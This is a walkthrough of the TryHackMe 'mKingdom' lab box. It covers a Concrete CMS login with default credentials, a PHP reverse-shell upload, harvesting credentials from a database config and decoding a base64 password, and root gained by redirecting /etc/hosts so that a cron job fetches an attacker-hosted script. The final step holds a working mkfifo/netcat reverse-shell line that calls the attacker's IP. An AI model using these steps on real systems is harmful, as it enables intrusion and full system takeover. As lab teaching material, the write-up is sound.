---
clayout: ctf
title: mKingdom
type: TryHackMe
date: 2025-04-05
level: Easy
icon: /ctf/tryhackme/mKingdom/icon-room.png
image: /ctf/tryhackme/mKingdom/icon-room.png
description: Beginner-friendly box inspired by a certain mustache man.
ctf-link: https://tryhackme.com/room/mkingdom
---

## Challenge Overview

The target is a web application hosted at `10.10.52.157`. The objective of this assessment is to identify and exploit vulnerabilities in order to gain an initial foothold, escalate privileges through multiple user accounts, and ultimately obtain root access.

## Initial Enumeration

### Nmap Scan – Port and Service Discovery

We begin with a standard Nmap scan to identify open ports and determine which services are running:

```bash
nmap -sC -sV -oN nmap.txt 10.10.52.157
```

**Scan Results:**

```bash
PORT   STATE SERVICE VERSION
85/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))
|_http-server-header: Apache/2.4.7 (Ubuntu)
|_http-title: 0H N0! PWN3D 4G4IN
| http-methods:
|_  Supported Methods: OPTIONS GET HEAD POST
```

**Analysis:**  

Only one port, `85/tcp`, is open, hosting an HTTP service running Apache 2.4.7 on Ubuntu. This narrows our focus to web-based attack vectors.

## Web Application Enumeration

### Manual Inspection

Navigating to `http://10.10.52.157:85` reveals a custom homepage:

![Homepage](/ctf/tryhackme/mKingdom/home.png)

### Directory Bruteforcing with Gobuster

To uncover hidden directories and endpoints, we conduct a brute-force scan using Gobuster:

```bash
gobuster dir -u http://10.10.52.157:85 -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -o gobuster.txt
```

**Key Finding:** `/app` — A new accessible directory.

![Gobuster Results](/ctf/tryhackme/mKingdom/gobuster.png)

Visiting `http://10.10.52.157:85/app` reveals an additional application interface:

![App Page](/ctf/tryhackme/mKingdom/app.png)

Clicking the **"Jump"** button redirects us to `/app/castle/index.php`, indicating the presence of a potentially complex backend.

![Jump Page](/ctf/tryhackme/mKingdom/toad-website.png)

### Technology Fingerprinting

Using Wappalyzer, we determine that the web application is running **Concrete CMS 8.5.2**:

![Wappalyzer](/ctf/tryhackme/mKingdom/wappalyzer.png)

This information is valuable for vulnerability research.

### Vulnerability Research

A known Remote Code Execution (RCE) vulnerability exists in **Concrete CMS 8.5.2**, as documented in this [HackerOne report](https://hackerone.com/reports/768322). The vulnerability can be exploited via improper file upload mechanisms, leading to arbitrary code execution.

## Exploitation – Initial Foothold

### Admin Login Panel Discovery

Navigating to `/app/castle/login` reveals an admin login interface:

![Login Page](/ctf/tryhackme/mKingdom/login.png)

We attempt a few default credentials and successfully authenticate using:

- **Username:** `admin`  
- **Password:** `password`

![Admin Dashboard](/ctf/tryhackme/mKingdom/dashboard.png)

### Remote Code Execution via PHP Upload

Within the admin dashboard, we navigate to the File Manager. By modifying the configuration, we enable uploads for `.php` files:

![File Types](/ctf/tryhackme/mKingdom/file-types.png)

We then upload a **PHP reverse shell** from [PentestMonkey](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php):

![Upload](/ctf/tryhackme/mKingdom/upload.png)

### Triggering the Reverse Shell

To catch the shell, we start a listener:

```bash
nc -lvnp 1234
```

Then trigger the payload by accessing:

```
http://10.10.52.157:85/app/castle/application/files/8017/4384/2617/reverse-shell.php
```

We successfully receive a reverse shell:

![Reverse Shell](/ctf/tryhackme/mKingdom/reverse-shell.png)

Shell stabilization:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm
```

## Privilege Escalation

### User Enumeration

We check `/etc/passwd` and discover two local users:

```bash
mario:x:1001:1001:,,,:/home/mario:/bin/bash
toad:x:1002:1002:,,,:/home/toad:/bin/bash
```

### Switching to `toad` User

Examining the CMS configuration file reveals credentials:

```bash
cat /var/www/html/app/castle/application/config/database.php
```

```php
'username' => 'toad',
'password' => '*************',
```

Using these credentials, we successfully switch to the `toad` user:

![Toad Access](/ctf/tryhackme/mKingdom/toad.png)

### Escalating to `mario` User

While exploring `toad`’s environment variables, we notice a suspicious base64-encoded token:

```bash
echo "********************" | base64 -d
```

This reveals the password for the `mario` user. We then switch users:

![Mario Access](/ctf/tryhackme/mKingdom/mario.png)

### Reading the User Flag

Although we locate the user flag in `/home/mario/user.txt`, direct access via `cat` is restricted due to permissions. However, the `cat` binary is setuid and owned by `toad`:

```bash
ls -al /bin/cat
-rwsr-xr-x 1 toad root 47904 Mar 10  2016 /bin/cat
```

To bypass restrictions, we use `less` instead:

```bash
less user.txt
```

## Privilege Escalation to Root

### Sudo Permission Enumeration

Checking sudo privileges:

```bash
sudo -l
```

Returns:

```bash
(ALL) /usr/bin/id
```

This is not useful for privilege escalation.

### Observing Scheduled Tasks with `pspy64`

To identify potential privilege escalation vectors, we run `pspy64` and observe the following:

```bash
curl mkingdom.thm:85/app/castle/application/counter.sh
```

This suggests a scheduled task periodically fetches and executes a remote script.

![pspy64 Output](/ctf/tryhackme/mKingdom/pspy64.png)

### Exploiting the Scheduled Script

#### Step 1: Domain Redirection

We redirect the domain `mkingdom.thm` to our attacking machine by modifying `/etc/hosts`:

```bash
echo "
127.0.0.1       localhost
10.11.125.246   mkingdom.thm
127.0.0.1       backgroundimages.concrete5.org
127.0.0.1       www.concrete5.org
127.0.0.1       newsflow.concrete5.org

::1     ip6-localhost ip6-loopback
fe00::0 ip6-localnet
ff00::0 ip6-mcastprefix
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
" > /etc/hosts
```

*Note: `echo` is used due to the absence of text editors like `nano` or `vi`.*

#### Step 2: Crafting Malicious Payload

We recreate the expected path and payload:

```bash
mkdir -p app/castle/application
```

Create `counter.sh` with reverse shell code:

```bash
#!/bin/bash
rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.11.125.246 9999 >/tmp/f
```

Make it executable:

```bash
chmod +x counter.sh
```

#### Step 3: Hosting and Listening

We host the file using Python’s built-in server:

```bash
sudo python3 -m http.server 85
```

And prepare the Netcat listener:

```bash
nc -lvnp 9999
```

Once the cron job executes the script, a root shell is established:

![Request Incoming](/ctf/tryhackme/mKingdom/request.png)  
![Root Shell](/ctf/tryhackme/mKingdom/reverse-shell-root.png)